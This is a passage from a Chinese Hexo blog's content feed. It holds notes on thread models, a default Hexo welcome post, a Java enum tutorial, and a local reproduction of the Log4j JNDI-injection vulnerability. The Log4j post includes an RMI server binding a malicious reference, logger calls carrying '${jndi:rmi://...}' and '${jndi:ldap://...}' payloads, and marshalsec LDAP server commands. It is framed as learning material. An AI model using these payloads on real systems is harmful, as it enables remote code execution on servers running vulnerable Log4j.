id="📗线程实现在用户空间下"><a href="#📗线程实现在用户空间下" class="headerlink" title="📗线程实现在用户空间下"></a>📗线程实现在用户空间下</h4><p><strong><font color="#ef7050">「在早期的操作系统中，所有的线程都是在用户空间下实现的，即不支持内核级线程，只支持用户级线程，CPU的时间片切换是以进程为维度的。」</font></strong></p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/线程实现在用户空间_r.jpg" alt="线程实现在用户空间_r"></p><h4 id="📗线程实现在内核空间下"><a href="#📗线程实现在内核空间下" class="headerlink" title="📗线程实现在内核空间下"></a>📗线程实现在内核空间下</h4><ul><li>由于现在主流的操作系统都支持<code>用户级线程</code>和<code>内核级线程</code>，而这两种线程存在于两个不同的内存空间，如何使用合理地使用这两种线程就成为了一个问题，于是就<code>“多线程模型”</code>。</li></ul><h5 id="📌多对一线程模型"><a href="#📌多对一线程模型" class="headerlink" title="📌多对一线程模型"></a>📌多对一线程模型</h5><ul><li><img src="C:\Users\YH\Desktop\多对一模型.png" alt="多对一模型"></li><li>虽然该线程模型实现了<code>内核级线程</code>，但是</li><li>一个进程对应一个内核级线程</li></ul><p>对着王道的视频看完，结合三秋，和google的总结一下。得出个了覆盖了王道的视频全部，然后去清华那边对比将内容补充完整，最后与剩下的资料一一校对</p><ul><li><a href="https://www.bilibili.com/video/BV1YE411D7nH/?spm_id_from=333.337.search-card.all.click">王道</a></li><li><a href="https://zhuanlan.zhihu.com/p/343597285">知乎-用户空间和内核空间的区别</a></li><li><a href="https://fhfirehuo.github.io/Attacking-Java-Rookie/Chapter07/Thread.html">Java线程与内核线程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> categories1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tags1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> categories4 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tags2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>休息休息</title>
      <link href="/posts/b860aee8.html"/>
      <url>/posts/b860aee8.html</url>
      
        <content type="html"><![CDATA[<h4 id="⭐前提说明"><a href="#⭐前提说明" class="headerlink" title="⭐前提说明"></a>⭐前提说明</h4><ul><li>最近Apache Log4j被爆出有JNDI注入的漏洞，网上已经有非常详细的解释了，咱们也跟风一次，复现一下过程。</li><li><font color="red">【**本地演示全部在本地进行，文章内容仅限于学习研究之用，不要用于非法用途，不传播。**】</font></li></ul><p><br/></p><h4 id="⭐什么是JNDI"><a href="#⭐什么是JNDI" class="headerlink" title="⭐什么是JNDI"></a>⭐什么是JNDI</h4><ul><li>JNDI，全名：Java Name Directory Interface，SUN公司提供的一种标准的Java命名系统接口</li><li>JNDI主要有两部分组成：应用程序编程接口【<strong>API</strong>】和服务供应商接口【<strong>SPI</strong>】。<ul><li>应用程序编程接口：提供了Java应用程序<strong>访问</strong>各种命名和<strong>目录服务</strong>的功能</li><li>服务供应商接口：提供了任意一种服务的供应商使用的功能。</li></ul></li><li>通俗点来说，sun公司定义了规范【即JNDI】，服务提供商通过JNDI规范创造服务，开发人员通过服务商提供的服务和JNDI规范创造应用。如果没有同一个标准，不同的服务商与开发人员，有着各种各样的标准，这学习成本，光记忆不同标准就需要花非常多时间，所以JNDI是非常必要的。</li><li>咱们只是引用下别人的知识，如果那里写得错了，可以留言告诉我</li></ul><p><br/></p><h4 id="⭐其他服务"><a href="#⭐其他服务" class="headerlink" title="⭐其他服务"></a>⭐其他服务</h4><ul><li>RMI【JAVA远程方法调用】</li><li>LDAP【轻量级目录访问协议】</li><li>CORBA【公共对象请求代理体系结构】</li><li>DNS【域名服务】</li></ul><p><br/></p><h4 id="⭐JNDI和不同服务"><a href="#⭐JNDI和不同服务" class="headerlink" title="⭐JNDI和不同服务"></a>⭐JNDI和不同服务</h4><ul><li>JNDI的存在其实是为了协同其他应用来进行远程服务，它可以在客户端和服务端中都进行一些工作，其目的是为了将应用统一管理。</li><li>所以log4j漏洞就是通过其他服务注入到本地服务的JNDI</li></ul><p><br/></p><h4 id="⭐log4J漏洞执行流程"><a href="#⭐log4J漏洞执行流程" class="headerlink" title="⭐log4J漏洞执行流程"></a>⭐log4J漏洞执行流程</h4><ul><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/log4j原理.png" alt="log4j原理"></li></ul><p><br/></p><h4 id="⭐创建springboot工程"><a href="#⭐创建springboot工程" class="headerlink" title="⭐创建springboot工程"></a>⭐创建springboot工程</h4><ul><li><p>导入依赖，springboot好像默认使用slf4j+logback的方式来记录日志。所以需要去掉默认设置</p></li><li><p>```xml</p><!--导入springboot，去掉默认日志--><p><dependency></p><pre><code>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;exclusions&gt;    &lt;exclusion&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;    &lt;/exclusion&gt;&lt;/exclusions&gt;</code></pre><p>&lt;/dependency&gt;</p><!--加入log4j--><p><dependency></p><pre><code>&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;version&gt;2.1.4.RELEASE&lt;/version&gt;</code></pre><p>&lt;/dependency&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">#### ⭐JNDI与RMI复现log4j漏洞</span><br><span class="line"></span><br><span class="line">- 启动一个JNDI服务并绑定一个恶意类【恶意类实现不提供了，大体上是让本地服务弹出计算器】</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public class RmiServer &#123;</span><br><span class="line">        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">            //启动一个JNDI服务</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">    </span><br><span class="line">            //创建一个恶意资源，注意参数className，factory的前缀，前缀代表了包的结构</span><br><span class="line">            Reference reference = new Reference(&quot;***&quot;, &quot;***&quot;, &quot;http://127.0.0.1:8081/&quot;);</span><br><span class="line">            ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);</span><br><span class="line">    </span><br><span class="line">            //给资源命名，并绑定</span><br><span class="line">            registry.bind(&quot;remote&quot;, refObjWrapper);</span><br><span class="line">    </span><br><span class="line">            System.out.println(&quot;攻击资源已经绑定到JNDI...&#x27;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>自定义一个Restful风格的方法，方法中创建log4j对象并调用记录日志的方法，其实是模拟了服务器记录平常的日志信息</p><ul><li><font color="red">【注意：高本版JDK默认不允许从远程的Codebase加载Reference工厂类，需要手动开启】</font> </li><li><p>```java<br>@Controller<br>@RequestMapping(“/Rmi”)<br>public class Rmi {</p><pre><code>private static final Logger logger = LogManager.getLogger(Rmi.class);@GetMappingpublic void login() &#123;    System.out.println(&quot;记录登录日志&quot;);    //The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.    System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);    //JNDI注入，模拟用户恶意请求    logger.error(&quot;$&#123;jndi:rmi://你的IP/remote&#125;&quot;);&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- log4j执行原理网上有很多分析了，大概原理如下</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    @Test</span><br><span class="line">    public void Jndi()&#123;</span><br><span class="line">        //log4j包含了这个执行顺序，所有只需要修改lookup的uri参数就能注入JNDI</span><br><span class="line">        try &#123;</span><br><span class="line">            System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</span><br><span class="line">            String uri = &quot;rmi://你的IP/remote&quot;;</span><br><span class="line">            Context ctx = new InitialContext();</span><br><span class="line">            Object lookup = ctx.lookup(uri);</span><br><span class="line">            System.out.println(lookup);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>启动springboot并调用对应的方法，效果如下</p><ul><li>可以看到请求的是本地服务，然后本地服务执行的代码应该是记录日志才对，但是却执行了远端的代码，而远端代码成功让本地服务弹出了电脑的计算器</li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/log4j原理gif.gif" alt="log4j原理gif"></li></ul></li></ul><p><br/></p><h4 id="⭐JNDI与LDAP复现log4j漏洞"><a href="#⭐JNDI与LDAP复现log4j漏洞" class="headerlink" title="⭐JNDI与LDAP复现log4j漏洞"></a>⭐JNDI与LDAP复现log4j漏洞</h4><ul><li>还是老样子，在本地构建一个远端服务，该服务包含了ldap协议</li></ul><p><br/></p><p>✅从github下工具包</p><ul><li>随便找个文件夹克隆git仓库<ul><li><code>git clone git@github.com:mbechler/marshalsec.git</code></li></ul></li><li>保持路径不变，使用命令打开文件夹<ul><li><code>cd marshalsec</code></li></ul></li><li>进入文件夹后，使用maven命令打包，前提是电脑已经安装与配置过maven工具<ul><li><code>mvn clean package -DskipTests</code></li></ul></li><li>打包成功后，在文件夹中找到以下两个压缩包，后面需要这两个jar包创建一个包含ldap的服务<ul><li><code>marshalsec-0.0.3-SNAPSHOT</code></li><li><code>marshalsec-0.0.3-SNAPSHOT-all</code></li></ul></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/获取ldap驱动包.png" alt="获取ldap驱动包"></li></ul><p><br/></p><p>✅创建ldap服务</p><ul><li>复制上面两个jar包到idea工程的随便一个文件夹</li><li>在该文件夹下创建一个恶意类<ul><li><font color="red">【注意：不能包含包名，不能有中文，不能直接别的地方复制【必须手写，好像idea也不允许复制class文件】】</font> </li></ul></li><li>从终端打开该文件夹，编写最初的javac命令，将恶意类编译成class文件<ul><li><code>javac Attack.java</code></li></ul></li><li>使用命令创建ldap服务并绑定恶意类<ul><li>注意：有的终端命令打印可能没有<code>#</code>号，执行的命令中必须包含<code>#</code>号</li><li><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:1389/#Attack&quot;</code></li></ul></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/创建ldap服务绑定攻击类.png" alt="创建ldap服务绑定攻击类"></li></ul><p><br/></p><p>✅启动springboot并访问</p><ul><li><p>与上面一样，创建并启动一个springboot，能用浏览器访问到log4j对象中记录日志的方法即可</p><ul><li><font color="red">【也需要开启允许从远程的Codebase加载Reference工厂类】</font> </li><li><pre><code class="lang-java">@Controller@RequestMapping(&quot;/LDAP&quot;)public class LDAP &#123;    private static final Logger logger = LogManager.getLogger(LDAP.class);    @GetMapping    public void login() &#123;        System.setProperty(&quot;com.sun.jndi.Ldap.object.trustURLCodebase&quot;, &quot;true&quot;);        logger.error(&quot;params:&#123;&#125;&quot;,&quot;$&#123;jndi:ldap://127.0.0.1:1389/Attack&#125;&quot;);    &#125;&#125;</code></pre></li></ul></li><li><p>可以看到与上面一样，访问的还是本地的服务，本地服务也应该记录日志才对，但是一样执行了远端的代码，而远端代码同样成功让本地服务弹出了电脑的计算器</p><ul><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/ldap.gif" alt="ldap"></li></ul></li></ul><p><br/></p><h4 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h4><ul><li>其实这个漏洞其实非常危险的，因为它能让服务器执行任意代码，而我们现实中很多东西实际上在服务器不就是一堆数据而已嘛</li><li>不过大厂都有安全顾问，也有非常多的安全措施</li><li>现在网络上已经有很多解决方案了，而且也有很多人在修复问题了</li><li>最后<strong>网络不是法外之地</strong></li><li><img src="http://pic.baicai.icu/springboot复现JNDI注入log4j2过程.assets/网络不是法外之地.jpg" alt="网络不是法外之地"></li></ul>]]></content>
      
      
      <categories>
          
          <category> categories3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tags3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大萨达</title>
      <link href="/posts/6803c72c.html"/>
      <url>/posts/6803c72c.html</url>
      
        <content type="html"><![CDATA[<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h4 id="⭐什么是枚举"><a href="#⭐什么是枚举" class="headerlink" title="⭐什么是枚举"></a>⭐什么是枚举</h4><ul><li>中文的释义，指的是可以一个一个列举</li><li><p>即在一个特定的范围内，有穷的集合，如一年有12个月，一周有7天</p></li><li><p>正因为这种有穷的集合，通常在代码设计中，使用枚举类来定义词典，如是否删除的表示，y表示是，n表示否，也可以说，键值对的映射关系，类似与map集合，redis这种。</p></li></ul><h4 id="⭐Java中的枚举诞生"><a href="#⭐Java中的枚举诞生" class="headerlink" title="⭐Java中的枚举诞生"></a>⭐Java中的枚举诞生</h4><h5 id="✅为何需要枚举类型"><a href="#✅为何需要枚举类型" class="headerlink" title="✅为何需要枚举类型"></a>✅为何需要枚举类型</h5><ul><li>枚举类型是 Java 5 中增加的一个小特性，在此之前，实现枚举的方式为定义编译期常量形式。代码中使用编译期常量的方式在理解性和安全性方面存在不足，单纯的常量数值不能够直观的体现出其作为枚举实例的目的，且实际中无限的取值空间也不能很好的与理论上有限的枚举空间相匹配。</li></ul><h5 id="✅静态常量实现字典"><a href="#✅静态常量实现字典" class="headerlink" title="✅静态常量实现字典"></a>✅静态常量实现字典</h5><ul><li><p>假定使用int类型定义一年中的四季    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SPRING</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUMMER</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">AUTUMN</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">WINTER</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">testSeason</span><span class="params">(<span class="type">int</span> season)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (season)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line"><span class="comment">// 春天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"><span class="comment">// 夏天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line"><span class="comment">// 秋天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line"><span class="comment">// 冬天...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Season.SPRING);</span><br><span class="line">System.out.println(Season.SUMMER);</span><br><span class="line"></span><br><span class="line">testSeason(<span class="number">1</span>);</span><br><span class="line">testSeason(Season.SPRING)</span><br><span class="line">testSeason(-<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul><ul><li><font color="Orange">*可以看到没有办法通知或者限制调用者需要传递的参数，只要是int值都是合法数据，这个算不上一个好的设计*</font> </li></ul><h5 id="✅改进静态常量实现字典"><a href="#✅改进静态常量实现字典" class="headerlink" title="✅改进静态常量实现字典"></a>✅改进静态常量实现字典</h5><ul><li><p>改进上述例子，就可以让一个普通类达到枚举一样效果（这也是枚举<a href="#mime">反编译</a>后的效果，下文有详述）</p><ul><li><p>将上述的int类型常量修改为Season类型，并将类声明为final防止被继承。构造函数声明为private，防止外部实例化。</p></li><li><p>```java<br>public final class Season {</p><pre><code>public static final Season SPRING = new Season();public static final Season SUMMER = new Season();public static final Season AUTUMN = new Season();public static final Season WINTER = new Season();private Season()&#123;&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- ```java</span><br><span class="line">  void testSeason(Season season)&#123;</span><br><span class="line">  // ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>testSeason(Season.SPRING);<br>testSeason(Season.SUMMER);</p><p>testSeason(1);// 编译报错<br>testSeason(“SPRING”);// 编译报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">- &lt;font color=&quot;Orange&quot;&gt;*可以看到没有通知调用者情况下，调用者只能传递已经定义好的Season类型，最多传递一个null，否则将无法通过编译，这也间接限制了调用者传递的数据类型*&lt;/font&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅枚举实现字典</span><br><span class="line"></span><br><span class="line">- 例如：一个季节枚举即可表示一年中的四季</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public enum SeasonEnum &#123;</span><br><span class="line">        SPRING,</span><br><span class="line">        SUMMER,</span><br><span class="line">        AUTUMN,</span><br><span class="line">        WINTER;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>void testSeason2(SeasonEnum season){</p><pre><code>switch (season)&#123;    case SPRING :        // 春天...        break;    case SUMMER :        // 夏天...        break;    case AUTUMN :        // 秋天...        break;    case WINTER :        // 冬天...        break;&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  testSeason(SeasonEnum.SPRING);</span><br><span class="line">  testSeason(SeasonEnum.SUMMER);</span><br><span class="line">  </span><br><span class="line">  testSeason(1);// 编译报错</span><br><span class="line">  testSeason(&quot;SPRING&quot;);// 编译报错</span><br></pre></td></tr></table></figure></li><li><font color="Orange">*可以看到，枚举类型的实例摆脱了数值的限制，能够以实例自身表达其作用和目的*</font> </li></ul></li></ul><h4 id="⭐定义枚举"><a href="#⭐定义枚举" class="headerlink" title="⭐定义枚举"></a>⭐定义枚举</h4><h5 id="✅规则"><a href="#✅规则" class="headerlink" title="✅规则"></a>✅规则</h5><ol><li>使用关键字<code>Enum</code>定义枚举</li><li>枚举值需要定义在枚举的构造方法，成员变量之前，枚举值以<code>;</code>分号结束<ul><li>这里的枚举值，和Java语法要求必须先定义enum实例是同一个意思，<strong>实际上通过反编译来看就是一个 static final 构造方法</strong></li></ul></li><li>枚举的构造方法<ul><li>可以使用<code>lombok</code>的无参构造方法<code>@NoArgsConstructor</code>和全参构造构造方法<code>@AllArgsConstructor</code></li><li>但是不能使用<code>lombok</code>的<code>@Data</code>，原因可能在编译的时候，枚举值编译成<code>static final</code>，无法再使用<code>@Data</code>的setter方法</li></ul></li><li>命名（阿里巴巴Java开发手册1.4.0）<ul><li><img src="枚举.assets/阿里巴巴开发手册-枚举.png" alt="阿里巴巴开发手册-枚举"></li><li><img src="枚举.assets/阿里巴巴开发手册-枚举2.png" alt="阿里巴巴开发手册-枚举2"></li></ul></li></ol><ul><li>需要注意的只有以上4点，其余部分和普通类一样，可以在枚举中定义普通的方法，接口，重写方法等等</li></ul><h5 id="✅示例"><a href="#✅示例" class="headerlink" title="✅示例"></a>✅示例</h5><ul><li>```java<br>// 最简单的枚举<br>public enum SeasonEnum {<pre><code>SPRING,SUMMER,AUTUMN,WINTER;</code></pre>} <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // 接口</span><br><span class="line">  public interface Sports &#123;</span><br><span class="line">      void swim();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 带参的枚举，实现接口并重写toString方法</span><br><span class="line">  @NoArgsConstructor</span><br><span class="line">  @AllArgsConstructor</span><br><span class="line">  public enum SeasonEnum implements Sports&#123;</span><br><span class="line">      SPRING(&quot;1&quot;,&quot;春天&quot;),</span><br><span class="line">      SUMMER(&quot;2&quot;,&quot;夏天&quot;),</span><br><span class="line">      AUTUMN(&quot;3&quot;,&quot;秋天&quot;),</span><br><span class="line">      WINTER(&quot;4&quot;,&quot;冬天&quot;);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">      @Getter</span><br><span class="line">      private String index;</span><br><span class="line">  </span><br><span class="line">      @Getter</span><br><span class="line">      private String description;</span><br><span class="line">  </span><br><span class="line">      @Override</span><br><span class="line">      public String toString() &#123;</span><br><span class="line">          return &quot;SeasonEnum&#123;&quot; +</span><br><span class="line">                  &quot;description=&#x27;&quot; + description + &#x27;\&#x27;&#x27; +</span><br><span class="line">                  &quot;, index=&#x27;&quot; + index + &#x27;\&#x27;&#x27; +</span><br><span class="line">                  &#x27;&#125;&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      public void printSeason()&#123;</span><br><span class="line">          System.out.println(&quot;该枚举值的中文描述为：&quot; +this.description);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      @Override</span><br><span class="line">      public void swim() &#123;</span><br><span class="line">          System.out.println(&quot;夏天最好运动的方式是游泳...&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="⭐反编译"><a href="#⭐反编译" class="headerlink" title="⭐反编译"></a>⭐反编译</h4><h5 id="✅命令反编译"><a href="#✅命令反编译" class="headerlink" title="✅命令反编译"></a>✅<span id="mime">命令反编译</span></h5><ul><li>使用<code>javap -c SeasonEnum.class</code>命令反编译上述<code>SeasonEnum</code>枚举的字节码文件<ul><li><img src="枚举.assets/反编译1.png" alt="反编译1"></li><li><img src="枚举.assets/反编译2.png" alt="反编译2"></li><li><img src="枚举.assets/反编译3.png" alt="反编译3"></li></ul></li></ul><h5 id="✅还原成普通类"><a href="#✅还原成普通类" class="headerlink" title="✅还原成普通类"></a>✅还原成普通类</h5><ul><li><p>根据字节码的图片和其他博文，尽量还原<code>SeasonEnum</code>枚举的普通类形式</p><ul><li>在第一张图片的黄色框中可以看到，<code>SeasonEnum</code>是继承了<code>Enum</code>的，而在编码时期是无法手动继承，只能使用关键字实现这一继承</li><li><font color="Orange">*从第三张图片的static方法观察到，SeasonEnum内部声明的多个实例，其构造过程是编译器在静态代码库中，调用 SeasonEnum 自身和父类的构造函数完成定义的*</font> </li><li><p>还原的过程省略了如<code>toString</code>等方法，可得如下普通类</p></li><li><p>```java<br>public final class SeasonEnum extends java.lang.Enum {</p><pre><code>// 枚举值public static final SeasonEnum SPRING;public static final SeasonEnum SUMMER;public static final SeasonEnum AUTUMN;public static final SeasonEnum WINTER;// 枚举值数组private static final SeasonEnum[] $VALUES;// 定义的成员变量private String index;private String description;// 获取枚举数组public static SeasonEnum[] values() &#123;    return $VALUES.clone();&#125;// 根据枚举值的变量名获取枚举值public static SeasonEnum valueOf(String name) &#123;    return Enum.valueOf(SeasonEnum.class, name);&#125;// 带参构造方法private SeasonEnum(String name, int ordinal, String index, String description)&#123;    super(name, ordinal);    this.index = index;    this.description = description;&#125;// 初始化static&#123;    SPRING = new SeasonEnum(&quot;SPRING&quot;, 0, &quot;1&quot;, &quot;春天&quot;);    SUMMER = new SeasonEnum(&quot;SUMMER&quot;, 1, &quot;2&quot;, &quot;夏天&quot;);    AUTUMN = new SeasonEnum(&quot;AUTUMN&quot;, 2, &quot;3&quot;, &quot;秋天&quot;);    WINTER = new SeasonEnum(&quot;WINTER&quot;, 3, &quot;4&quot;, &quot;冬天&quot;);    $VALUES = (new SeasonEnum[] &#123;            SPRING, SUMMER, AUTUMN, WINTER    &#125;);&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 